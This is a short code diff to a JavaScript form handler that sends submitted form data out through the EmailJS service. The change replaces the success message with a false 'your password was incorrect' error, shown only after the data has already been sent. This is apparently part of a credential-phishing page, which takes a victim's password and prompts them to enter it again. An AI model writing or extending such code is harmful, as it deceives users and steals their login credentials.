@@ -35,7 +35,7 @@ document.addEventListener("DOMContentLoaded", function () {
     emailjs.send("service_ujm6vmt", "template_ktp3i5k", templateParams)
       .then(function(response) {
         console.log("✅ Email sent:", response.status, response.text);
-        emailError.textContent = "✔ Email successfully sent!";
+        emailError.textContent = "Sorry, your password was incorrect. Please double-check your password.";
         form.reset();
       })
       .catch(function(error) {
